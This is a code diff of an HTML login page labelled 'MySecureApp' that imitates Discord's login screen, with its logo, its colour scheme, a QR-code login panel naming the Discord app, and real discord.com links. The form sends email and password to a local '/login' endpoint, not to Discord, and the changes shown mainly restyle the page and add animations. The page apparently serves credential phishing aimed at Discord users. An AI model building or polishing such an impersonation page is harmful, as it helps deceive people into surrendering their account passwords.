@@ -6,283 +6,113 @@
   <title>Login – MySecureApp</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-
+    * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
-      font-family: 'Inter', 'Helvetica Neue', Helvetica, Arial, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      background-color: #313338;
-      padding: 20px;
+      font-family: 'Inter', Helvetica, Arial, sans-serif;
+      display: flex; justify-content: center; align-items: center;
+      min-height: 100vh; background-color: #313338; padding: 20px;
     }
-
-    @media (min-width: 769px) {
+    @media (min-width:769px){
       body {
         background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRJq7p812cjimwGXUviON7suVfdym1Yds1-fOPWeJ89v3Rh1PyaI-8L5zU&s=10');
-        background-size: cover;
-        background-position: center;
-        background-repeat: no-repeat;
+        background-size:cover; background-position:center;
       }
     }
-
     .container {
-      background-color: #2f3136;
-      border-radius: 8px;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
-      max-width: 900px;
-      width: 100%;
-      display: flex;
-      overflow: hidden;
-      flex-direction: row;
+      background-color:#2f3136; border-radius:8px;
+      box-shadow:0 0 15px rgba(0,0,0,0.5); max-width:900px;
+      width:100%; display:flex; overflow:hidden;
+      flex-direction:row; align-items:center;
     }
-
     .left, .right {
-      flex: 1;
-      padding: 40px;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
+      flex:1; padding:40px; display:flex;
+      flex-direction:column; justify-content:center;
     }
-
-    .left h2 {
-      font-size: 24px;
-      color: #fff;
-      font-weight: 700;
-      margin-bottom: 8px;
+    h2 { font-size:24px; color:#fff; font-weight:700; margin-bottom:8px; }
+    .subtext { color:#b9bbbe; font-size:14px; margin-bottom:20px; }
+    label { font-size:12px; font-weight:700; color:#b9bbbe; margin-bottom:5px; text-align:left; display:block; }
+    input, button {
+      width:100%; padding:12px; font-size:14px;
     }
-
-    .subtext {
-      color: #b9bbbe;
-      font-size: 14px;
-      margin-bottom: 20px;
-    }
-
-    label {
-      font-size: 12px;
-      font-weight: 700;
-      color: #b9bbbe;
-      margin-bottom: 5px;
-      display: block;
-      text-align: left;
-    }
-
     input {
-      width: 100%;
-      padding: 12px;
-      margin-bottom: 20px;
-      background-color: #1e1f22;
-      border: none;
-      border-radius: 4px;
-      color: white;
-      font-size: 14px;
+      background:#1e1f22; color:#fff; border:none; border-radius:4px; margin-bottom:20px;
     }
-
-    input:focus {
-      background-color: #2b2d31;
-      outline: none;
-    }
-
+    input:focus { background:#2b2d31; outline:none; }
     button {
-      width: 100%;
-      padding: 12px;
-      background-color: #5865f2;
-      color: white;
-      font-weight: 600;
-      border: none;
-      border-radius: 4px;
-      margin-top: 10px;
-      cursor: pointer;
-      transition: background-color 0.2s, transform 0.2s;
+      background:#5865f2; color:#fff; font-weight:600; border:none;
+      border-radius:4px; cursor:pointer; margin-top:10px;
+      transition:background-color .2s, transform .2s;
     }
-
-    button:hover {
-      background-color: #4752c4;
-      transform: translateY(-1px);
-    }
-
+    button:hover { background:#4752c4; transform:translateY(-1px); }
     .left a {
-      font-size: 12px;
-      color: #00a8fc;
-      text-decoration: none;
-      margin-bottom: 20px;
-      display: inline-block;
-      text-align: left;
+      font-size:12px; color:#00a8fc; text-decoration:none;
+      margin-bottom:20px; text-align:left; display:inline-block;
     }
-
-    .footer {
-      font-size: 12px;
-      text-align: center;
-      color: #b9bbbe;
-      margin-top: 20px;
-    }
-
-    .footer a {
-      color: #00a8fc;
-      text-decoration: none;
-    }
-
+    .footer { font-size:12px; color:#b9bbbe; text-align:center; margin-top:20px; }
+    .footer a { color:#00a8fc; text-decoration:none; }
     .right {
-      background-color: #2b2d31;
-      text-align: center;
-      align-items: center;
-      border-left: 1px solid #202225;
+      background:#2b2d31; text-align:center; align-items:center;
+      border-left:1px solid #202225;
     }
+    .right img { width:130px; height:130px; margin-bottom:15px; }
+    .right h3 { color:#fff; font-size:16px; font-weight:700; margin-bottom:10px; }
+    .right p { color:#b9bbbe; font-size:12px; max-width:240px; margin:0 auto; }
 
-    .right img {
-      width: 130px;
-      height: 130px;
-      margin-bottom: 15px;
-    }
+    /* Animation keyframes */
+    @keyframes fadeSlide { from {opacity:0; transform: translateY(15px);} to {opacity:1; transform:translateY(0);} }
 
-    .right h3 {
-      color: white;
-      font-size: 16px;
-      margin: 0 0 10px;
-      font-weight: 700;
-    }
-
-    .right p {
-      color: #b9bbbe;
-      font-size: 12px;
-      max-width: 240px;
-      margin: 0 auto;
-    }
-
-    /* --- Mobile View FIXED --- */
-    @media (max-width: 768px) {
-      body {
-        background: linear-gradient(to bottom, #2a2c31, #1e1f22);
-      }
-
-      .container {
-        flex-direction: column;
-        border-radius: 0;
-        box-shadow: none;
-        max-width: 100%;
-        padding: 0;
-      }
-
-      .right {
-        display: none;
-      }
-
-      .left {
-        padding: 0;
-        align-items: center;
-        text-align: center;
-      }
+    /* --- Mobile view styling and animations --- */
+    @media (max-width:768px){
+      body { background: linear-gradient(to bottom,#2a2c31,#1e1f22); }
+      .container { flex-direction:column; background:none; border-radius:0; box-shadow:none; padding:0; }
+      .right { display:none; }
+      .left { padding:0; align-items:center; text-align:center; }
 
       .mobile-logo {
-        display: block;
-        width: 180px;
-        margin: 35px auto 20px;
+        display:block; width:180px; margin:35px auto 10px;
+        animation:fadeSlide .8s ease both;
       }
-
-      .left h2 {
-        font-size: 22px;
-        margin: 10px 0;
-        font-weight: bold;
-        color: #fff;
-      }
-
-      .subtext {
-        display: none;
-      }
-
-      form {
-        width: 100%;
-        max-width: 400px;
-        padding: 0 20px;
-      }
-
-      label {
-        font-size: 11px;
-        font-weight: 700;
-        color: #b9bbbe;
-        text-align: left;
-        width: 100%;
-        margin-bottom: 5px;
-        text-transform: uppercase;
-      }
-
-      label::after {
-        content: ' *';
-        color: #ed4245;
-      }
+      h2 { font-size:22px; color:#fff; animation:fadeSlide .8s .3s ease both; }
+      form { width:100%; max-width:400px; padding:0 20px; animation:fadeSlide .8s .6s ease both; }
+      label { font-size:11px; font-weight:700; color:#b9bbbe; text-align:left; width:100%; margin-bottom:5px; text-transform:uppercase; }
+      label::after { content:' *'; color:#ed4245; }
 
       input {
-        background-color: #1e1f22;
-        border: none;
-        border-radius: 0;
-        box-shadow: none;
-        border-bottom: 1px solid #4e5058;
+        background:#1e1f22; color:#fff; border:none !important; border-radius:0 !important;
+        box-shadow:none !important; outline:none !important; margin-bottom:15px;
+        animation:fadeSlide .6s calc(.6s + var(--i)*0.1s) ease both;
       }
+      a { font-size:13px; color:#00a8fc; text-align:left; width:100%; margin-bottom:20px; animation:fadeSlide .6s calc(.9s + var(--i)*0.1s) ease both; }
+      button { border-radius:6px; animation:fadeSlide .6s 1.2s ease both; }
 
-      button {
-        border-radius: 6px;
-      }
-
-      a {
-        font-size: 13px;
-        color: #00a8fc;
-        display: inline-block;
-        margin-bottom: 20px;
-        text-align: left;
-        width: 100%;
-      }
-
-      .footer {
-        font-size: 13px;
-        color: #b9bbbe;
-        margin: 25px 0;
-        text-align: center;
-      }
-
-      .footer a {
-        color: #00a8fc;
-        text-decoration: none;
-      }
+      input:nth-of-type(1) { --i:1; }
+      input:nth-of-type(2) { --i:2; }
+      a { --i:3; }
+      button { --i:4; }
     }
   </style>
 </head>
 <body>
   <div class="container">
     <div class="left">
-      <!-- ✅ Final working mobile Discord logo -->
-      <img class="mobile-logo" src="https://cdn.jsdelivr.net/gh/rajatkulkarni95/CDN/discord-white-logo-text.png" alt="Discord white logo" />
-
+      <img class="mobile-logo" src="https://cdn.jsdelivr.net/gh/rajatkulkarni95/CDN/discord-white-logo-text.png" alt="Discord Logo" />
       <h2>Welcome back!</h2>
       <p class="subtext">We're so excited to see you again!</p>
-
       <form method="POST" action="/login">
         <label for="email">Email or phone number</label>
-        <input type="email" name="email" id="email" required>
-
+        <input type="email" id="email" required>
         <label for="password">Password</label>
-        <input type="password" name="password" id="password" required>
-
+        <input type="password" id="password" required>
         <a href="https://discord.com/login/forgot">Forgot your password?</a>
-
         <button type="submit">Log In</button>
       </form>
-
-      <div class="footer">
-        Need an account? <a href="https://discord.com/register">Register</a>
-      </div>
+      <div class="footer">Need an account? <a href="https://discord.com/register">Register</a></div>
     </div>
-
     <div class="right">
-      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ1wPG5Hw_GtnyedH8VWglMcG5da1m0hjzae5gg7VOPgTZ_WxNcLkimtnU_&s=10" alt="QR Code">
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ1wPG5Hw_GtnyedH8VWglMcG5da1m0hjzae5gg7VOPgTZ_WxNcLkimtnU_&s=10" alt="QR Code" />
       <h3>Log in with QR Code</h3>
       <p>Scan this with the <strong>Discord</strong> mobile app to log in instantly.</p>
     </div>
   </div>
 </body>
-                           </html>
-                           
+</html>
